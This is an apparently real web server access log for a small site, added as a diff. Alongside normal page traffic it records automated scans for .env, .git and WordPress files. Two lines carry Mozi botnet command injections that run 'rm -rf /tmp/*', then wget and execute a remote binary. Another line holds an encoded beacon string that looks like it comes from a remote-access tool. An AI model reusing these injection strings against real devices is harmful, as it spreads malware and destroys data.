+95.214.235.205 - - [10/Dec/2022 19:41:32] "POST / HTTP/1.1" 405 -
+45.79.181.104 - - [10/Dec/2022 19:59:43] code 400, message Bad request version ('À\x14À')
+45.79.181.104 - - [10/Dec/2022 19:59:43] "   Ù*òMÔtÌtÈfÕÐx÷3Îyð-è]m>àÝ   À/À0À+À,Ì¨Ì©ÀÀ	ÀÀ" HTTPStatus.BAD_REQUEST -
+128.14.134.134 - - [10/Dec/2022 20:21:18] "GET / HTTP/1.1" 200 -
+135.125.246.110 - - [10/Dec/2022 20:47:32] "POST / HTTP/1.1" 405 -
+135.125.246.110 - - [10/Dec/2022 20:47:33] "GET /.env HTTP/1.1" 404 -
+185.254.196.115 - - [10/Dec/2022 20:53:31] "GET /.env HTTP/1.1" 404 -
+185.254.196.115 - - [10/Dec/2022 20:53:31] "POST / HTTP/1.1" 405 -
+117.253.152.30 - - [10/Dec/2022 20:57:48] "GET /boaform/admin/formLogin?username=adminisp&psd=adminisp HTTP/1.0" 404 -
+183.136.225.32 - - [10/Dec/2022 21:24:59] "GET / HTTP/1.1" 200 -
+183.136.225.32 - - [10/Dec/2022 21:31:45] "GET /static/assets/house.svg HTTP/1.1" 200 -
+183.136.225.32 - - [10/Dec/2022 21:31:46] "GET /robots.txt HTTP/1.1" 404 -
+183.136.225.32 - - [10/Dec/2022 21:31:47] "GET /static/js/index.js HTTP/1.1" 200 -
+159.203.108.144 - - [10/Dec/2022 21:32:51] code 400, message Bad request version ('À\x14À')
+159.203.108.144 - - [10/Dec/2022 21:32:51] " {  wÓ8ðsO¶âz¯ êñ.@bëmJùWÒ®h¡  À/À+ÀÀÀÀ	ÀÀ" HTTPStatus.BAD_REQUEST -
+159.203.108.144 - - [10/Dec/2022 21:32:51] code 400, message Bad HTTP/0.9 request type ('\x16\x03\x01\x00{\x01\x00\x00w\x03\x03©\x07\x92sèbÜd¥¬ò»\x83\xadè8\x9erÈu@\x17åv"×Óö^gÌ¦\x00\x00\x1aÀ/À+À\x11À\x07À\x13À')
+159.203.108.144 - - [10/Dec/2022 21:32:51] " {  w©sèbÜd¥¬ò»­è8rÈu@åv"×Óö^gÌ¦  À/À+ÀÀÀÀ	ÀÀ" HTTPStatus.BAD_REQUEST -
+159.203.108.144 - - [10/Dec/2022 21:32:52] "GET / HTTP/1.1" 200 -
+112.152.36.226 - - [10/Dec/2022 21:39:35] "GET /static/css/reset.css HTTP/1.1" 304 -
+112.152.36.226 - - [10/Dec/2022 21:39:35] "GET /static/css/style.css HTTP/1.1" 304 -
+112.152.36.226 - - [10/Dec/2022 21:39:35] "GET /static/css/writestyle.css HTTP/1.1" 304 -
+112.152.36.226 - - [10/Dec/2022 21:39:35] "GET /static/js/write.js HTTP/1.1" 304 -
+112.152.36.226 - - [10/Dec/2022 21:39:35] "GET /static/assets/search.png HTTP/1.1" 304 -
+112.152.36.226 - - [10/Dec/2022 21:39:35] "GET /static/assets/like.png HTTP/1.1" 304 -
+112.152.36.226 - - [10/Dec/2022 21:39:35] "GET /static/assets/mypage.png HTTP/1.1" 304 -
+112.152.36.226 - - [10/Dec/2022 21:39:35] "GET /favicon.ico HTTP/1.1" 404 -
+162.142.125.213 - - [10/Dec/2022 22:00:39] "GET / HTTP/1.1" 200 -
+162.142.125.213 - - [10/Dec/2022 22:00:40] "GET / HTTP/1.1" 200 -
+162.142.125.213 - - [10/Dec/2022 22:00:40] code 505, message Invalid HTTP version (2.0)
+162.142.125.213 - - [10/Dec/2022 22:00:40] "PRI * HTTP/2.0" HTTPStatus.HTTP_VERSION_NOT_SUPPORTED -
+162.142.125.213 - - [10/Dec/2022 22:00:41] "GET /../static/assets/house.svg HTTP/1.1" 404 -
+162.142.125.213 - - [10/Dec/2022 22:00:41] "GET /../static/assets/house.svg HTTP/1.1" 404 -
+162.142.125.213 - - [10/Dec/2022 22:00:41] "GET /favicon.ico HTTP/1.1" 404 -
+45.79.181.223 - - [10/Dec/2022 22:06:27] code 400, message Bad request version ('À\x14À')
+45.79.181.223 - - [10/Dec/2022 22:06:27] "   O°âmjy¾q¿ãúÞûßSÜk½qâ   À/À0À+À,Ì¨Ì©ÀÀ	ÀÀ" HTTPStatus.BAD_REQUEST -
+43.129.97.125 - - [10/Dec/2022 22:26:49] "GET / HTTP/1.1" 200 -
+20.21.122.159 - - [10/Dec/2022 22:28:59] "GET /.env HTTP/1.1" 404 -
+20.21.122.159 - - [10/Dec/2022 22:28:59] "POST / HTTP/1.1" 405 -
+184.105.139.98 - - [10/Dec/2022 22:34:44] "GET / HTTP/1.1" 200 -
+184.105.139.74 - - [10/Dec/2022 22:39:24] "GET /favicon.ico HTTP/1.1" 404 -
+185.254.196.115 - - [10/Dec/2022 22:47:23] "GET /.env HTTP/1.1" 404 -
+185.254.196.115 - - [10/Dec/2022 22:47:25] "POST / HTTP/1.1" 405 -
+221.141.147.164 - - [10/Dec/2022 22:51:45] "GET / HTTP/1.1" 200 -
+221.141.147.164 - - [10/Dec/2022 22:51:45] "GET /static/css/reset.css HTTP/1.1" 200 -
+221.141.147.164 - - [10/Dec/2022 22:51:45] "GET /static/css/style.css HTTP/1.1" 200 -
+221.141.147.164 - - [10/Dec/2022 22:51:45] "GET /static/js/index.js HTTP/1.1" 200 -
+221.141.147.164 - - [10/Dec/2022 22:51:45] "GET /static/assets/search.png HTTP/1.1" 200 -
+221.141.147.164 - - [10/Dec/2022 22:51:45] "GET /static/assets/like.png HTTP/1.1" 200 -
+221.141.147.164 - - [10/Dec/2022 22:51:45] "GET /static/assets/mypage.png HTTP/1.1" 200 -
+221.141.147.164 - - [10/Dec/2022 22:51:45] "GET /static/assets/story_img1.png HTTP/1.1" 200 -
+221.141.147.164 - - [10/Dec/2022 22:51:45] "GET /static/assets/menu/american/steak.png HTTP/1.1" 200 -
+221.141.147.164 - - [10/Dec/2022 22:51:45] "GET /static/assets/call.png HTTP/1.1" 200 -
+221.141.147.164 - - [10/Dec/2022 22:51:46] "GET /static/assets/house.svg HTTP/1.1" 200 -
+221.141.147.164 - - [10/Dec/2022 22:51:46] "GET /static/assets/house.svg HTTP/1.1" 304 -
+221.141.147.164 - - [10/Dec/2022 22:51:47] "GET /Good_Say HTTP/1.1" 200 -
+221.141.147.164 - - [10/Dec/2022 22:51:56] "GET /map HTTP/1.1" 200 -
+221.141.147.164 - - [10/Dec/2022 22:51:56] "GET /static/css/header.css HTTP/1.1" 200 -
+221.141.147.164 - - [10/Dec/2022 22:51:56] "GET /static/css/map.css HTTP/1.1" 200 -
+221.141.147.164 - - [10/Dec/2022 22:51:56] "GET /static/assets/search2.png HTTP/1.1" 200 -
+221.141.147.164 - - [10/Dec/2022 22:51:56] "GET /static/assets/like2.png HTTP/1.1" 200 -
+221.141.147.164 - - [10/Dec/2022 22:51:56] "GET /static/css/reset.css HTTP/1.1" 304 -
+221.141.147.164 - - [10/Dec/2022 22:51:56] "GET /static/assets/mypage2.png HTTP/1.1" 200 -
+221.141.147.164 - - [10/Dec/2022 22:51:56] "GET /favicon.ico HTTP/1.1" 404 -
+210.220.95.255 - - [10/Dec/2022 22:55:05] "GET / HTTP/1.1" 200 -
+135.125.246.110 - - [10/Dec/2022 23:14:06] "POST / HTTP/1.1" 405 -
+135.125.246.110 - - [10/Dec/2022 23:14:07] "GET /.env HTTP/1.1" 404 -
+135.125.246.110 - - [10/Dec/2022 23:56:34] "POST / HTTP/1.1" 405 -
+135.125.246.110 - - [10/Dec/2022 23:56:35] "GET /.env HTTP/1.1" 404 -
+95.214.235.205 - - [11/Dec/2022 00:11:21] "GET /.env HTTP/1.1" 404 -
+95.214.235.205 - - [11/Dec/2022 00:11:21] "POST / HTTP/1.1" 405 -
+84.21.172.128 - - [11/Dec/2022 00:11:25] "GET / HTTP/1.1" 200 -
+45.79.181.94 - - [11/Dec/2022 00:13:28] code 400, message Bad request version ('À\x14À')
+45.79.181.94 - - [11/Dec/2022 00:13:28] "   ;+/ëøtweåÖ¡Ôiû»Å¥Úrà,ù   À/À0À+À,Ì¨Ì©ÀÀ	ÀÀ" HTTPStatus.BAD_REQUEST -
+179.43.162.73 - - [11/Dec/2022 01:16:19] "GET /_profiler/phpinfo HTTP/1.1" 404 -
+185.254.196.115 - - [11/Dec/2022 01:25:27] "GET /.env HTTP/1.1" 404 -
+185.254.196.115 - - [11/Dec/2022 01:25:28] "POST / HTTP/1.1" 405 -
+20.198.78.24 - - [11/Dec/2022 01:41:22] "GET / HTTP/1.1" 200 -
+20.198.78.24 - - [11/Dec/2022 01:41:23] "GET / HTTP/1.1" 200 -
+20.198.78.24 - - [11/Dec/2022 01:41:23] "GET /wp-includes/wlwmanifest.xml HTTP/1.1" 404 -
+20.198.78.24 - - [11/Dec/2022 01:41:23] "GET /xmlrpc.php?rsd HTTP/1.1" 404 -
+20.198.78.24 - - [11/Dec/2022 01:41:24] "GET / HTTP/1.1" 200 -
+20.198.78.24 - - [11/Dec/2022 01:41:24] "GET /blog/wp-includes/wlwmanifest.xml HTTP/1.1" 404 -
+20.198.78.24 - - [11/Dec/2022 01:41:24] "GET /web/wp-includes/wlwmanifest.xml HTTP/1.1" 404 -
+20.198.78.24 - - [11/Dec/2022 01:41:25] "GET /wordpress/wp-includes/wlwmanifest.xml HTTP/1.1" 404 -
+20.198.78.24 - - [11/Dec/2022 01:41:25] "GET /website/wp-includes/wlwmanifest.xml HTTP/1.1" 404 -
+20.198.78.24 - - [11/Dec/2022 01:41:26] "GET /wp/wp-includes/wlwmanifest.xml HTTP/1.1" 404 -
+20.198.78.24 - - [11/Dec/2022 01:41:26] "GET /news/wp-includes/wlwmanifest.xml HTTP/1.1" 404 -
+20.198.78.24 - - [11/Dec/2022 01:41:26] "GET /wp1/wp-includes/wlwmanifest.xml HTTP/1.1" 404 -
+20.198.78.24 - - [11/Dec/2022 01:41:26] "GET /test/wp-includes/wlwmanifest.xml HTTP/1.1" 404 -
+20.198.78.24 - - [11/Dec/2022 01:41:27] "GET /wp2/wp-includes/wlwmanifest.xml HTTP/1.1" 404 -
+20.198.78.24 - - [11/Dec/2022 01:41:27] "GET /site/wp-includes/wlwmanifest.xml HTTP/1.1" 404 -
+20.198.78.24 - - [11/Dec/2022 01:41:27] "GET /cms/wp-includes/wlwmanifest.xml HTTP/1.1" 404 -
+20.198.78.24 - - [11/Dec/2022 01:41:28] "GET /sito/wp-includes/wlwmanifest.xml HTTP/1.1" 404 -
+45.79.181.104 - - [11/Dec/2022 01:54:04] code 400, message Bad request version ('À\x14À')
+45.79.181.104 - - [11/Dec/2022 01:54:04] "   ì?èçGAæÙKO~bñÏ|dFà¹lhZì   À/À0À+À,Ì¨Ì©ÀÀ	ÀÀ" HTTPStatus.BAD_REQUEST -
+198.235.24.17 - - [11/Dec/2022 02:07:11] "GET / HTTP/1.0" 200 -
+135.125.246.110 - - [11/Dec/2022 02:14:46] "POST / HTTP/1.1" 405 -
+135.125.246.110 - - [11/Dec/2022 02:14:46] "GET /.env HTTP/1.1" 404 -
+172.105.89.161 - - [11/Dec/2022 02:18:23] "GET /0bef HTTP/1.0" 404 -
+92.255.85.173 - - [11/Dec/2022 02:34:39] code 400, message Bad HTTP/0.9 request type ('\x03\x00\x00/*à\x00\x00\x00\x00\x00Cookie:')
+92.255.85.173 - - [11/Dec/2022 02:34:39] "  /*à     Cookie: mstshash=Administr" HTTPStatus.BAD_REQUEST -
+185.254.196.115 - - [11/Dec/2022 02:37:08] "GET /.env HTTP/1.1" 404 -
+185.254.196.115 - - [11/Dec/2022 02:37:10] "POST / HTTP/1.1" 405 -
+135.125.246.110 - - [11/Dec/2022 02:42:46] "POST / HTTP/1.1" 405 -
+135.125.246.110 - - [11/Dec/2022 02:42:47] "GET /.env HTTP/1.1" 404 -
+109.237.98.226 - - [11/Dec/2022 03:09:40] "GET /.env HTTP/1.1" 404 -
+109.237.98.226 - - [11/Dec/2022 03:09:40] code 400, message Bad request version ('5?\x02\x00b\x13\x02\x13\x03\x13\x01À,À0À+À/Ì©Ì¨\x00£\x00\x9f\x00¢\x00\x9eÌªÀ¯À\xadÀ$À(À')
+109.237.98.226 - - [11/Dec/2022 03:09:40] "H DÒ>B¼K¸$ìº _xE*]õìQ< Ò)á6BýÈ¼]hJ	KíÖ¥k9ã¹75? bÀ,À0À+À/Ì©Ì¨ £  ¢ ÌªÀ¯À­À$À(À" HTTPStatus.BAD_REQUEST -
+193.118.53.194 - - [11/Dec/2022 03:14:41] "GET / HTTP/1.1" 200 -
+220.198.240.62 - - [11/Dec/2022 03:17:16] "GET /setup.cgi?next_file=netgear.cfg&todo=syscmd&cmd=rm+-rf+/tmp/*;wget+http://192.168.1.1:8088/Mozi.m+-O+/tmp/netgear;sh+netgear&curpath=/&currentsetting.htm=1 HTTP/1.0" 404 -
+172.105.128.13 - - [11/Dec/2022 03:54:32] code 400, message Bad request version ('À\x14À')
+172.105.128.13 - - [11/Dec/2022 03:54:32] "   î Ô+X7Ñ §jâ Ãì'ÄÑ{ÝX±9û¯«   À/À0À+À,Ì¨Ì©ÀÀ	ÀÀ" HTTPStatus.BAD_REQUEST -
+185.180.143.138 - - [11/Dec/2022 04:51:17] "GET / HTTP/1.1" 200 -
+185.180.143.138 - - [11/Dec/2022 04:51:17] "GET / HTTP/1.1" 200 -
+185.254.196.115 - - [11/Dec/2022 04:53:53] "GET /.env HTTP/1.1" 404 -
+185.254.196.115 - - [11/Dec/2022 04:53:57] "POST / HTTP/1.1" 405 -
+135.125.246.110 - - [11/Dec/2022 05:18:29] "POST / HTTP/1.1" 405 -
+135.125.246.110 - - [11/Dec/2022 05:18:29] "GET /.env HTTP/1.1" 404 -
+172.105.128.11 - - [11/Dec/2022 05:50:02] code 400, message Bad HTTP/0.9 request type ('\x16\x03\x01\x00')
+172.105.128.11 - - [11/Dec/2022 05:50:02] "   " HTTPStatus.BAD_REQUEST -
+95.214.235.205 - - [11/Dec/2022 06:19:18] "GET /.env HTTP/1.1" 404 -
+95.214.235.205 - - [11/Dec/2022 06:19:19] "POST / HTTP/1.1" 405 -
+135.125.246.110 - - [11/Dec/2022 06:40:39] "POST / HTTP/1.1" 405 -
+135.125.246.110 - - [11/Dec/2022 06:40:39] "GET /.env HTTP/1.1" 404 -
+183.136.225.32 - - [11/Dec/2022 06:41:59] "GET / HTTP/1.1" 200 -
+183.136.225.32 - - [11/Dec/2022 06:46:32] "GET /static/assets/house.svg HTTP/1.1" 200 -
+183.136.225.32 - - [11/Dec/2022 06:46:32] "GET /robots.txt HTTP/1.1" 404 -
+183.136.225.32 - - [11/Dec/2022 06:46:42] "GET /static/js/index.js HTTP/1.1" 200 -
+27.43.204.34 - - [11/Dec/2022 06:56:13] "POST /GponForm/diag_Form?images/ HTTP/1.1" 404 -
+192.241.198.39 - - [11/Dec/2022 06:59:25] "GET /druid/index.html HTTP/1.1" 404 -
+185.254.196.115 - - [11/Dec/2022 07:25:10] "GET /.env HTTP/1.1" 404 -
+185.254.196.115 - - [11/Dec/2022 07:25:10] "POST / HTTP/1.1" 405 -
+45.79.181.94 - - [11/Dec/2022 07:56:54] code 400, message Bad request version ('À\x14À')
+45.79.181.94 - - [11/Dec/2022 07:56:54] "   92J W¨gBUú't9²³àb%å"   À/À0À+À,Ì¨Ì©ÀÀ	ÀÀ" HTTPStatus.BAD_REQUEST -
+135.125.246.110 - - [11/Dec/2022 08:57:00] "POST / HTTP/1.1" 405 -
+135.125.246.110 - - [11/Dec/2022 08:57:01] "GET /.env HTTP/1.1" 404 -
+112.152.36.226 - - [11/Dec/2022 08:57:50] "GET / HTTP/1.1" 200 -
+112.152.36.226 - - [11/Dec/2022 08:57:51] "GET /static/css/reset.css HTTP/1.1" 304 -
+112.152.36.226 - - [11/Dec/2022 08:57:51] "GET /static/css/style.css HTTP/1.1" 304 -
+112.152.36.226 - - [11/Dec/2022 08:57:52] "GET /static/js/index.js HTTP/1.1" 304 -
+112.152.36.226 - - [11/Dec/2022 08:57:52] "GET /static/assets/search.png HTTP/1.1" 304 -
+112.152.36.226 - - [11/Dec/2022 08:57:52] "GET /static/assets/menu/american/steak.png HTTP/1.1" 304 -
+112.152.36.226 - - [11/Dec/2022 08:57:53] "GET /static/assets/like.png HTTP/1.1" 304 -
+112.152.36.226 - - [11/Dec/2022 08:57:53] "GET /static/assets/mypage.png HTTP/1.1" 304 -
+112.152.36.226 - - [11/Dec/2022 08:57:53] "GET /static/assets/story_img1.png HTTP/1.1" 304 -
+112.152.36.226 - - [11/Dec/2022 08:57:53] "GET /static/assets/call.png HTTP/1.1" 304 -
+112.152.36.226 - - [11/Dec/2022 08:57:57] "GET /Good_Say HTTP/1.1" 200 -
+20.198.78.24 - - [11/Dec/2022 09:01:00] "GET /.env HTTP/1.1" 404 -
+20.198.78.24 - - [11/Dec/2022 09:01:00] "POST / HTTP/1.1" 405 -
+112.152.36.226 - - [11/Dec/2022 09:08:36] "GET / HTTP/1.1" 200 -
+112.152.36.226 - - [11/Dec/2022 09:08:36] "GET /static/css/reset.css HTTP/1.1" 200 -
+112.152.36.226 - - [11/Dec/2022 09:08:36] "GET /static/css/style.css HTTP/1.1" 200 -
+112.152.36.226 - - [11/Dec/2022 09:08:58] "GET /static/js/index.js HTTP/1.1" 200 -
+112.152.36.226 - - [11/Dec/2022 09:08:58] "GET /static/assets/search.png HTTP/1.1" 200 -
+112.152.36.226 - - [11/Dec/2022 09:08:58] "GET /static/assets/like.png HTTP/1.1" 200 -
+112.152.36.226 - - [11/Dec/2022 09:08:59] "GET /Good_Say HTTP/1.1" 200 -
+112.152.36.226 - - [11/Dec/2022 09:09:11] "GET /static/assets/mypage.png HTTP/1.1" 200 -
+112.152.36.226 - - [11/Dec/2022 09:09:11] "GET /static/assets/story_img1.png HTTP/1.1" 200 -
+112.152.36.226 - - [11/Dec/2022 09:09:13] "GET /static/assets/menu/american/steak.png HTTP/1.1" 200 -
+112.152.36.226 - - [11/Dec/2022 09:09:13] "GET /static/assets/call.png HTTP/1.1" 200 -
+112.152.36.226 - - [11/Dec/2022 09:09:13] "GET /static/assets/house.svg HTTP/1.1" 200 -
+112.152.36.226 - - [11/Dec/2022 09:09:13] "GET /static/assets/house.svg HTTP/1.1" 304 -
+99.82.168.44 - - [11/Dec/2022 09:10:00] "GET / HTTP/1.1" 200 -
+99.82.168.46 - - [11/Dec/2022 09:10:01] "GET /static/css/reset.css HTTP/1.1" 200 -
+99.82.168.41 - - [11/Dec/2022 09:10:01] "GET /static/css/style.css HTTP/1.1" 200 -
+99.82.168.41 - - [11/Dec/2022 09:10:02] "GET /static/js/index.js HTTP/1.1" 200 -
+99.82.168.44 - - [11/Dec/2022 09:10:02] "GET /static/assets/search.png HTTP/1.1" 200 -
+99.82.168.44 - - [11/Dec/2022 09:10:02] "GET /static/assets/like.png HTTP/1.1" 200 -
+99.82.168.44 - - [11/Dec/2022 09:10:02] "GET /static/assets/call.png HTTP/1.1" 200 -
+99.82.168.45 - - [11/Dec/2022 09:10:02] "GET /static/assets/menu/american/steak.png HTTP/1.1" 200 -
+99.82.168.46 - - [11/Dec/2022 09:10:02] "GET /static/assets/mypage.png HTTP/1.1" 200 -
+99.82.168.45 - - [11/Dec/2022 09:10:02] "GET /static/assets/story_img1.png HTTP/1.1" 200 -
+99.82.168.46 - - [11/Dec/2022 09:10:06] "GET /Good_Say HTTP/1.1" 200 -
+99.82.168.44 - - [11/Dec/2022 09:10:06] "GET /static/assets/house.svg HTTP/1.1" 200 -
+99.82.168.46 - - [11/Dec/2022 09:10:06] "GET /static/assets/house.svg HTTP/1.1" 304 -
+99.82.169.77 - - [11/Dec/2022 09:14:11] "GET / HTTP/1.1" 200 -
+99.82.169.78 - - [11/Dec/2022 09:14:12] "GET /static/assets/house.svg HTTP/1.1" 200 -
+18.191.159.106 - - [11/Dec/2022 09:14:13] "GET /.env HTTP/1.1" 404 -
+99.82.162.200 - - [11/Dec/2022 09:17:32] "GET /view/viewer_index.shtml HTTP/1.1" 404 -
+99.82.162.200 - - [11/Dec/2022 09:21:41] "GET / HTTP/1.1" 200 -
+18.191.159.106 - - [11/Dec/2022 09:28:23] "GET /.env HTTP/1.1" 404 -
+64.62.197.162 - - [11/Dec/2022 09:43:14] "GET / HTTP/1.1" 200 -
+99.82.167.202 - - [11/Dec/2022 09:43:49] code 400, message Bad request version ('À\x14À')
+99.82.167.202 - - [11/Dec/2022 09:43:49] " {  wQVI¨tàOÎ60·Ä[Óe'¡@8HNw  À/À+ÀÀÀÀ	ÀÀ" HTTPStatus.BAD_REQUEST -
+99.82.167.205 - - [11/Dec/2022 09:43:49] code 400, message Bad request version ('À\x14À')
+99.82.167.205 - - [11/Dec/2022 09:43:49] " {  wñnÒ¸>ajh/úEpÏ1"òöbQµy*8x  À/À+ÀÀÀÀ	ÀÀ" HTTPStatus.BAD_REQUEST -
+99.82.167.205 - - [11/Dec/2022 09:43:49] "GET / HTTP/1.1" 200 -
+64.62.197.160 - - [11/Dec/2022 09:46:06] "GET /favicon.ico HTTP/1.1" 404 -
+66.240.205.34 - - [11/Dec/2022 09:47:03] code 400, message Bad request version ("x64|'|'|No|'|'|0.7d|'|'|..|'|'|AA==|'|'|112.inf|'|'|SGFjS2VkDQoxOTIuMTY4LjkyLjIyMjo1NTUyDQpEZXNrdG9wDQpjbGllbnRhLmV4ZQ0KRmFsc2UNCkZhbHNlDQpUcnVlDQpGYWxzZQ==12.act|'|'|AA==")
+66.240.205.34 - - [11/Dec/2022 09:47:03] "145.ll|'|'|SGFjS2VkX0Q0OTkwNjI3|'|'|WIN-JNAPIER0859|'|'|JNapier|'|'|19-02-01|'|'||'|'|Win 7 Professional SP1 x64|'|'|No|'|'|0.7d|'|'|..|'|'|AA==|'|'|112.inf|'|'|SGFjS2VkDQoxOTIuMTY4LjkyLjIyMjo1NTUyDQpEZXNrdG9wDQpjbGllbnRhLmV4ZQ0KRmFsc2UNCkZhbHNlDQpUcnVlDQpGYWxzZQ==12.act|'|'|AA==" HTTPStatus.BAD_REQUEST -
+51.159.152.255 - - [11/Dec/2022 09:49:29] "GET / HTTP/1.1" 200 -
+51.159.152.255 - - [11/Dec/2022 09:49:30] "GET /favicon.ico HTTP/1.1" 404 -
+135.125.246.110 - - [11/Dec/2022 09:50:52] "POST / HTTP/1.1" 405 -
+135.125.246.110 - - [11/Dec/2022 09:50:53] "GET /.env HTTP/1.1" 404 -
+99.82.175.136 - - [11/Dec/2022 09:51:16] code 400, message Bad request version ('À\x14À')
+99.82.175.136 - - [11/Dec/2022 09:51:16] "   ÿêÍàzÑ}?h·`ÄÒq"Wû8ó\B]ý8²¦U   À/À0À+À,Ì¨Ì©ÀÀ	ÀÀ" HTTPStatus.BAD_REQUEST -
+99.82.175.171 - - [11/Dec/2022 09:53:41] code 400, message Bad request version ('À\x14À')
+99.82.175.171 - - [11/Dec/2022 09:53:41] "   /úx=³W¢íjÏGþ0OkæÉF3rU6· )b;]þ   À/À0À+À,Ì¨Ì©ÀÀ	ÀÀ" HTTPStatus.BAD_REQUEST -
+117.212.173.192 - - [11/Dec/2022 10:00:48] code 400, message Bad HTTP/0.9 request type ('27;wget%20http://%s:%d/Mozi.m%20-O%20->%20/tmp/Mozi.m;chmod%20777%20/tmp/Mozi.m;/tmp/Mozi.m%20dlink.mips%27$')
+117.212.173.192 - - [11/Dec/2022 10:00:48] "27;wget%20http://%s:%d/Mozi.m%20-O%20->%20/tmp/Mozi.m;chmod%20777%20/tmp/Mozi.m;/tmp/Mozi.m%20dlink.mips%27$ HTTP/1.0" HTTPStatus.BAD_REQUEST -
+161.35.213.88 - - [11/Dec/2022 10:13:53] "GET / HTTP/1.1" 200 -
+161.35.213.88 - - [11/Dec/2022 10:13:53] "GET /favicon.ico HTTP/1.1" 404 -
+13.248.113.234 - - [11/Dec/2022 10:19:11] "GET /.env HTTP/1.1" 404 -
+13.248.113.232 - - [11/Dec/2022 10:19:12] "POST / HTTP/1.1" 405 -
+20.151.162.43 - - [11/Dec/2022 10:26:33] "GET /.env HTTP/1.1" 404 -
+20.151.162.43 - - [11/Dec/2022 10:26:33] "POST / HTTP/1.1" 405 -
+185.175.105.108 - - [11/Dec/2022 10:26:59] "GET / HTTP/1.0" 200 -
+213.188.96.118 - - [11/Dec/2022 10:34:29] "GET /phpmyadmin/ HTTP/1.1" 404 -
+13.248.111.46 - - [11/Dec/2022 10:34:59] "GET /.env HTTP/1.1" 404 -
+13.248.111.77 - - [11/Dec/2022 10:37:33] "GET /.env HTTP/1.1" 404 -
+185.254.196.115 - - [11/Dec/2022 10:47:00] "GET /.env HTTP/1.1" 404 -
+185.254.196.115 - - [11/Dec/2022 10:47:00] "POST / HTTP/1.1" 405 -
+130.211.54.158 - - [11/Dec/2022 10:47:33] "GET / HTTP/1.1" 200 -
+121.155.94.42 - - [11/Dec/2022 11:06:29] "GET / HTTP/1.0" 200 -
+13.248.98.142 - - [11/Dec/2022 11:10:34] "GET / HTTP/1.1" 200 -
+89.248.163.143 - - [11/Dec/2022 11:21:08] code 400, message Bad request syntax ('\x03\x00\x00\x13\x0eà\x00\x00\x00\x00\x00\x01\x00\x08\x00\x02\x00\x00\x00')
+89.248.163.143 - - [11/Dec/2022 11:21:08] "  à          " HTTPStatus.BAD_REQUEST -
+109.237.97.180 - - [11/Dec/2022 11:24:31] "GET /.env HTTP/1.1" 404 -
+109.237.97.180 - - [11/Dec/2022 11:24:31] code 400, message Bad request version ("(o¥'¿\x13\x92ð\x023\x97\x9f\x00b\x13\x02\x13\x03\x13\x01À,À0À+À/Ì©Ì¨\x00£\x00\x9f\x00¢\x00\x9eÌªÀ¯À\xadÀ$À(À")
+109.237.97.180 - - [11/Dec/2022 11:24:31] "H D	Ç6:«Åç¬Û+b"Ú(6Øôx'whÓ< kD1WK]J5Ë6÷P$õ (o¥'¿ð3 bÀ,À0À+À/Ì©Ì¨ £  ¢ ÌªÀ¯À­À$À(À" HTTPStatus.BAD_REQUEST -
+13.248.113.232 - - [11/Dec/2022 11:35:26] "GET /.env HTTP/1.1" 404 -
+13.248.113.234 - - [11/Dec/2022 11:35:27] "POST / HTTP/1.1" 405 -
+205.210.31.27 - - [11/Dec/2022 11:39:11] code 400, message Bad request version ('À(À$À\x14À')
+205.210.31.27 - - [11/Dec/2022 11:39:11] " Ê  Æt,ç¼ Êïaa-"Û4ëëÂjpÔ  hÌÌÀ/À+À0À,ÀÀÀ'À#ÀÀ	À(À$ÀÀ" HTTPStatus.BAD_REQUEST -
+99.82.168.41 - - [11/Dec/2022 11:45:28] "GET / HTTP/1.1" 200 -
+99.82.168.46 - - [11/Dec/2022 11:45:30] "GET /static/css/reset.css HTTP/1.1" 200 -
+99.82.168.41 - - [11/Dec/2022 11:45:30] "GET /static/css/style.css HTTP/1.1" 200 -
+99.82.168.45 - - [11/Dec/2022 11:45:31] "GET /static/js/index.js HTTP/1.1" 200 -
+99.82.168.41 - - [11/Dec/2022 11:45:31] "GET /static/assets/search.png HTTP/1.1" 200 -
+99.82.168.44 - - [11/Dec/2022 11:45:31] "GET /static/assets/like.png HTTP/1.1" 200 -
+99.82.168.44 - - [11/Dec/2022 11:45:31] "GET /static/assets/mypage.png HTTP/1.1" 200 -
+99.82.168.45 - - [11/Dec/2022 11:45:31] "GET /static/assets/story_img1.png HTTP/1.1" 200 -
+99.82.168.45 - - [11/Dec/2022 11:45:31] "GET /static/assets/call.png HTTP/1.1" 200 -
+99.82.168.44 - - [11/Dec/2022 11:45:31] "GET /static/assets/menu/american/steak.png HTTP/1.1" 200 -
+99.82.168.44 - - [11/Dec/2022 11:45:33] "GET /Good_Say HTTP/1.1" 200 -
+99.82.168.44 - - [11/Dec/2022 11:45:33] "GET /static/assets/house.svg HTTP/1.1" 200 -
+135.125.246.110 - - [11/Dec/2022 11:46:46] "POST / HTTP/1.1" 405 -
+135.125.246.110 - - [11/Dec/2022 11:46:47] "GET /.env HTTP/1.1" 404 -
+109.237.97.180 - - [11/Dec/2022 11:48:11] "GET /.env HTTP/1.1" 404 -
+109.237.97.180 - - [11/Dec/2022 11:48:11] code 400, message Bad request version ('¢¶kE$\x163Ç]ù;\x01±\x00b\x13\x02\x13\x03\x13\x01À,À0À+À/Ì©Ì¨\x00£\x00\x9f\x00¢\x00\x9eÌªÀ¯À\xadÀ$À(À')
+109.237.97.180 - - [11/Dec/2022 11:48:11] "H DÌUKù\(Î Â&15?ÌÉi.y/Ø­òµv=r Dg"w»¥ÒÄ÷I$üÊ"¶¢¶kE$3Ç]ù;± bÀ,À0À+À/Ì©Ì¨ £  ¢ ÌªÀ¯À­À$À(À" HTTPStatus.BAD_REQUEST -
+194.49.94.234 - - [11/Dec/2022 11:49:27] "GET /.git/config HTTP/1.1" 404 -
+13.248.113.206 - - [11/Dec/2022 11:49:31] "GET /.env HTTP/1.1" 404 -
+13.248.113.202 - - [11/Dec/2022 11:49:32] "POST / HTTP/1.1" 405 -
+183.87.15.215 - - [11/Dec/2022 11:51:18] "GET / HTTP/1.1" 200 -
+192.155.90.220 - - [11/Dec/2022 11:57:14] code 400, message Bad request version ('À\x14À')
+192.155.90.220 - - [11/Dec/2022 11:57:14] "   ÛàúÀPd Oü¦èr÷M¶hF¡4ÿ,®ÄÇÙúk   À/À0À+À,Ì¨Ì©ÀÀ	ÀÀ" HTTPStatus.BAD_REQUEST -
+45.79.181.94 - - [11/Dec/2022 12:03:28] code 400, message Bad request version ('À\x14À')
+45.79.181.94 - - [11/Dec/2022 12:03:28] "   Ê²·ù®îNiÛCCáP+þ&Ý²íÄVxù_«   À/À0À+À,Ì¨Ì©ÀÀ	ÀÀ" HTTPStatus.BAD_REQUEST -
+159.223.82.54 - - [11/Dec/2022 12:06:16] "GET / HTTP/1.0" 200 -
